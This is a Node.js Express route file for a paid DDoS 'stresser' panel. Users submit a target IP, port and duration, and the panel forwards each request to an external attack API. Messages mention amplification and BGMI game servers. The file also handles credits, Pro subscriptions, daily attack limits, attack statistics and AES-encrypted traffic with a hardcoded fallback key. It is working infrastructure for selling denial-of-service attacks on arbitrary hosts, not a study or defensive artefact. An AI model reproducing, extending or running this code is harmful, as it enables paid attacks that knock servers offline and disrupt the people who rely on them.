const express = require('express');
const router = express.Router();
const auth = require('../middleware/authMiddleware');
const User = require('../models/User');
const axios = require('axios');
const Stats = require('../models/Stats');
const CryptoJS = require('crypto-js');
const { verifyCaptcha } = require('./captcha');
require('dotenv').config();
const rateLimit = require('express-rate-limit');
const attackTracker = require('../services/attackTracker');

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'your-secret-key-2024-battle-destroyer';

/* ─── Encryption Helpers ──────────────────────────────────────── */

function decryptData(encryptedData) {
    try {
        const bytes = CryptoJS.AES.decrypt(encryptedData, ENCRYPTION_KEY);
        const decrypted = bytes.toString(CryptoJS.enc.Utf8);
        if (!decrypted) throw new Error('Decryption failed');
        return JSON.parse(decrypted);
    } catch (error) {
        console.error('Decryption error:', error);
        throw new Error('Invalid encrypted data');
    }
}

function encryptResponse(data) {
    const jsonString = JSON.stringify(data);
    return CryptoJS.AES.encrypt(jsonString, ENCRYPTION_KEY).toString();
}

function verifyHash(data, receivedHash) {
    const jsonString = JSON.stringify(data);
    const calculatedHash = CryptoJS.SHA256(jsonString + ENCRYPTION_KEY).toString();
    return calculatedHash === receivedHash;
}

function createHash(data) {
    const jsonString = JSON.stringify(data);
    return CryptoJS.SHA256(jsonString + ENCRYPTION_KEY).toString();
}

// In-memory attack tracker
const activeAttacks = new Map();

// Blocked ports
const BLOCKED_PORTS = new Set([8700, 20000, 443, 17500, 9031, 20002, 20001]);

// Middleware to decrypt request
async function decryptRequest(req, res, next) {
    try {
        const { encrypted, hash } = req.method === 'GET' ? req.query : req.body;

        if (!encrypted || !hash) {
            return res.status(400).json({ message: 'Encrypted data required' });
        }

        const decryptedData = decryptData(encrypted);

        if (!verifyHash(decryptedData, hash)) {
            return res.status(400).json({ message: 'Data integrity check failed' });
        }

        const currentTime = Date.now();
        const timeDiff = Math.abs(currentTime - decryptedData.timestamp);
        if (timeDiff > 5 * 60 * 1000) {
            return res.status(400).json({ message: 'Request expired. Please try again.' });
        }

        req.decryptedData = decryptedData;
        next();
    } catch (err) {
        console.error('Decryption middleware error:', err);
        const errorResponse = { message: 'Invalid encrypted payload' };
        const encryptedError = encryptResponse(errorResponse);
        const errorHash = createHash(errorResponse);
        return res.status(400).json({ encrypted: encryptedError, hash: errorHash });
    }
}

// GET /api/panel/me
// GET /api/panel/me - Simplified version without encryption
router.get('/me', auth, async (req, res) => {
    try {
        const user = await User.findById(req.user.id).select('-password');
        
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }

        await user.checkAndResetDailyCredits();

        const responseData = {
            ...user.toObject(),
            isPro: user.isProUser(),
            remainingAttacks: await user.getRemainingAttacks(),
            maxDuration: user.getMaxDuration(),
            subscriptionStatus: user.getSubscriptionStatus()
        };

        // Send without encryption for now
        res.json(responseData);
    } catch (err) {
        res.status(500).json({ message: 'Server error: ' + err.message });
    }
});

// GET /api/panel/attack-status
router.get('/attack-status', auth, decryptRequest, async (req, res) => {
    try {
        const attackInfo = activeAttacks.get(req.user.id.toString());

        let responseData;
        if (!attackInfo) {
            responseData = { success: true, data: { status: 'idle' } };
        } else {
            const elapsed = Date.now() - new Date(attackInfo.startedAt).getTime();
            if (elapsed >= attackInfo.duration * 1000) {
                activeAttacks.delete(req.user.id.toString());
                responseData = { success: true, data: { status: 'completed' } };
            } else {
                responseData = {
                    success: true,
                    data: {
                        status: 'running',
                        ip: attackInfo.ip,
                        port: attackInfo.port,
                        duration: attackInfo.duration,
                        startedAt: attackInfo.startedAt,
                        timeLeft: attackInfo.duration - Math.floor(elapsed / 1000)
                    }
                };
            }
        }

        const encryptedResponse = encryptResponse(responseData);
        const responseHash = createHash(responseData);
        res.json({ encrypted: encryptedResponse, hash: responseHash });
    } catch (err) {
        console.error('Attack status error:', err);
        const errorResponse = { message: 'Server error. Please try again.' };
        const encryptedError = encryptResponse(errorResponse);
        const errorHash = createHash(errorResponse);
        res.status(500).json({ encrypted: encryptedError, hash: errorHash });
    }
});

// GET /api/panel/stats — PUBLIC (no auth, no decryptRequest — shown on homepage)
const statsLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 30,
    message: { totalAttacks: 0, totalUsers: 0 }
});

router.get('/stats', statsLimiter, async (req, res) => {
    try {
        const stats = await Stats.findById('global');
        const responseData = {
            totalAttacks: stats?.totalAttacks || 0,
            totalUsers: stats?.totalUsers || 0,
        };

        const encryptedResponse = encryptResponse(responseData);
        const responseHash = createHash(responseData);
        res.json({ encrypted: encryptedResponse, hash: responseHash });
    } catch (err) {
        console.error('Stats error:', err);
        const errorResponse = { totalAttacks: 0, totalUsers: 0 };
        const encryptedError = encryptResponse(errorResponse);
        const errorHash = createHash(errorResponse);
        res.status(500).json({ encrypted: encryptedError, hash: errorHash });
    }
});

// Helper to get client IP
function getClientIp(req) {
    const raw = req.headers['cf-connecting-ip'] ||
        req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
        req.ip || '';
    let ip = raw.startsWith('::ffff:') ? raw.slice(7) : raw;
    if (ip === '::1') ip = '127.0.0.1';
    return ip;
}

// POST /api/panel/attack
// POST /api/panel/attack
router.post('/attack', auth, decryptRequest, async (req, res) => {
    try {
        const user = await User.findById(req.user.id).select('-password');
        if (!user) {
            const errorResponse = { message: 'User not found' };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(404).json({ encrypted: encryptedError, hash: errorHash });
        }

        const { ip, port, duration, captchaData } = req.decryptedData;

        if (!ip || !port || !duration || !captchaData) {
            const errorResponse = { message: 'IP, port, duration, and captcha are required' };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(400).json({ encrypted: encryptedError, hash: errorHash });
        }

        // Captcha verification
        const clientIp = getClientIp(req);
        const captchaToken = captchaData.token || captchaData;

        const captchaResult = await verifyCaptcha(
            captchaToken,
            null,
            clientIp
        );

        if (!captchaResult.ok) {
            const errorResponse = { message: captchaResult.reason || 'Captcha verification failed. Please try again.' };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(403).json({ encrypted: encryptedError, hash: errorHash });
        }

        console.log(`[ATTACK] Captcha verified for ${user.username}`);

        // Validate IP
        const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
        if (!ipRegex.test(ip)) {
            const errorResponse = { message: 'Invalid IP address format' };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(400).json({ encrypted: encryptedError, hash: errorHash });
        }

        // Validate port
        const portNum = parseInt(port);
        if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
            const errorResponse = { message: 'Port must be between 1 and 65535' };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(400).json({ encrypted: encryptedError, hash: errorHash });
        }

        if (BLOCKED_PORTS.has(portNum)) {
            const errorResponse = { message: `Port ${portNum} is blocked.` };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(400).json({ encrypted: encryptedError, hash: errorHash });
        }

        // Validate duration
        const durNum = parseInt(duration);
        const MAX_DURATION = user.isProUser() ? 300 : 60;

        if (isNaN(durNum) || durNum < 1) {
            const errorResponse = { message: 'Duration must be at least 1 second' };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(400).json({ encrypted: encryptedError, hash: errorHash });
        }

        if (durNum > MAX_DURATION) {
            const errorResponse = {
                message: user.isProUser()
                    ? 'Duration cannot exceed 300 seconds'
                    : 'Free accounts limited to 60s. Upgrade to Pro for 300s.',
                maxDuration: MAX_DURATION,
                isPro: user.isProUser(),
            };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(403).json({ encrypted: encryptedError, hash: errorHash });
        }

        // Check if user can attack
        const canAttack = await user.canAttack();
        if (!canAttack) {
            const remaining = await user.getRemainingAttacks();
            const errorResponse = {
                message: user.isProUser()
                    ? 'Daily attack limit reached (30 attacks). Please try again tomorrow.'
                    : 'Insufficient credits. Purchase credits or upgrade to Pro for unlimited attacks!',
                remainingAttacks: remaining,
                isPro: user.isProUser(),
                maxAttacks: user.isProUser() ? 30 : 'credits based'
            };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(403).json({ encrypted: encryptedError, hash: errorHash });
        }

        // Check for active attack
        if (activeAttacks.has(user._id.toString())) {
            const errorResponse = { message: 'You already have an attack running.' };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(400).json({ encrypted: encryptedError, hash: errorHash });
        }

        // Call external API
        const response = await axios.post(
            process.env.API_URL,
            { param1: ip, param2: portNum, param3: durNum },
            {
                headers: { 'Content-Type': 'application/json', 'x-api-key': process.env.API_KEY },
                timeout: 15000,
                validateStatus: () => true
            }
        );

        console.log(`[ATTACK] ${user.username} → ${ip}:${portNum} ${durNum}s | API: ${response.status} | Response:`, response.data);

        // Check for status 200 first
        if (response.status !== 200) {
            console.error(`[ATTACK] Non-200 status: ${response.status}`);
            const errorResponse = {
                message: 'Service temporarily unavailable. Please try again in a few moments.',
                retryAfter: 5
            };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(503).json({ encrypted: encryptedError, hash: errorHash });
        }

        // Check launched value
        const launched = response.data?.launched;
        const total = response.data?.total;

        if (launched === undefined) {
            console.error(`[ATTACK] Missing 'launched' field in response`);
            const errorResponse = {
                message: 'Invalid response from attack service. Please try again.',
                retryAfter: 3
            };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(500).json({ encrypted: encryptedError, hash: errorHash });
        }

        // Check if attack failed due to amplification connection error
        if (launched === 0) {
            console.error(`[ATTACK] Attack failed - launched=${launched}, total=${total}`);
            const errorResponse = {
                message: `Try again can't connect with bgmi servers`,
                reason: 'amplification_connection_error',
                retryAfter: 5,
                details: total ? `Only ${total} of 1 attack launched` : 'Connection failed'
            };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(503).json({ encrypted: encryptedError, hash: errorHash });
        }

        // Check if launch was successful (launched === 1)
        if (launched !== 1) {
            console.error(`[ATTACK] Unexpected launched value: ${launched}`);
            const errorResponse = {
                message: 'Unexpected response from attack service. Please try again.',
                retryAfter: 3
            };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(500).json({ encrypted: encryptedError, hash: errorHash });
        }

        // ===== SUCCESS: Attack launched successfully =====
        // ONLY NOW deduct credits when launched === 1
        console.log(`[ATTACK] ✅ Successfully launched attack for ${user.username} | Launched: ${launched}/${total}`);

        attackTracker.registerAttack({
            target: ip,
            port: portNum,
            duration: durNum,
            username: user.username,
            userId: user._id.toString(),
            source: 'panel'
        });

        // Use one attack (deduct credits)
        await user.useAttack();
        const remainingAttacks = await user.getRemainingAttacks();

        const startedAt = new Date().toISOString();
        activeAttacks.set(user._id.toString(), { ip, port: portNum, duration: durNum, startedAt });

        setTimeout(() => {
            activeAttacks.delete(user._id.toString());
        }, durNum * 1000 + 5000);

        await Stats.findByIdAndUpdate('global', { $inc: { totalAttacks: 1 } }, { upsert: true });

        const responseData = {
            message: user.isProUser()
                ? `Attack launched successfully! (${remainingAttacks} attacks remaining today)`
                : `Attack launched successfully! (${remainingAttacks} credits remaining)`,
            attack: { ip, port: portNum, duration: durNum, startedAt },
            remainingAttacks,
            isPro: user.isProUser(),
            credits: user.credits,
            dailyCredits: user.subscription.dailyCredits,
            totalAttacks: user.totalAttacks,
            user: {
                username: user.username,
                credits: user.credits,
                isPro: user.isProUser(),
                remainingAttacks
            },
            serviceStatus: {
                launched: launched,
                total: total,
                confirmed: true
            }
        };

        const encryptedResponse = encryptResponse(responseData);
        const responseHash = createHash(responseData);
        res.json({ encrypted: encryptedResponse, hash: responseHash });

    } catch (err) {
        console.error(`[ERROR] Attack route: ${err.message}`);

        // Check for axios specific errors
        if (err.code === 'ECONNREFUSED' || err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT') {
            const errorResponse = {
                message: 'Attack service is currently unavailable. Please try again in a few moments.',
                retryAfter: 5,
                errorType: 'connection_error'
            };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(503).json({ encrypted: encryptedError, hash: errorHash });
        }

        const errorResponse = { message: err.message || 'Server error. Please try again.' };
        const encryptedError = encryptResponse(errorResponse);
        const errorHash = createHash(errorResponse);
        res.status(500).json({ encrypted: encryptedError, hash: errorHash });
    }
});

// GET /api/panel/dashboard
router.get('/dashboard', auth, decryptRequest, async (req, res) => {
    try {
        const user = await User.findById(req.user.id).select('-password');
        if (!user) {
            const errorResponse = { message: 'User not found' };
            const encryptedError = encryptResponse(errorResponse);
            const errorHash = createHash(errorResponse);
            return res.status(404).json({ encrypted: encryptedError, hash: errorHash });
        }

        await user.checkAndResetDailyCredits();

        const subscriptionStatus = user.getSubscriptionStatus();

        const responseData = {
            user: {
                username: user.username,
                email: user.email,
                userId: user.userId,
                isPro: user.isProUser(),
                credits: user.credits,
                totalAttacks: user.totalAttacks,
                referralCode: user.referralCode,
                referralCount: user.referralCount
            },
            stats: {
                remainingAttacks: await user.getRemainingAttacks(),
                dailyAttacksUsed: user.dailyAttacks.count,
                dailyAttacksLimit: user.isProUser() ? 30 : (user.credits > 0 ? 'Unlimited with credits' : '0'),
                maxDuration: user.getMaxDuration(),
                subscription: subscriptionStatus
            }
        };

        const encryptedResponse = encryptResponse(responseData);
        const responseHash = createHash(responseData);
        res.json({ encrypted: encryptedResponse, hash: responseHash });
    } catch (err) {
        console.error('Dashboard error:', err);
        const errorResponse = { message: 'Server error' };
        const encryptedError = encryptResponse(errorResponse);
        const errorHash = createHash(errorResponse);
        res.status(500).json({ encrypted: encryptedError, hash: errorHash });
    }
});

module.exports = router;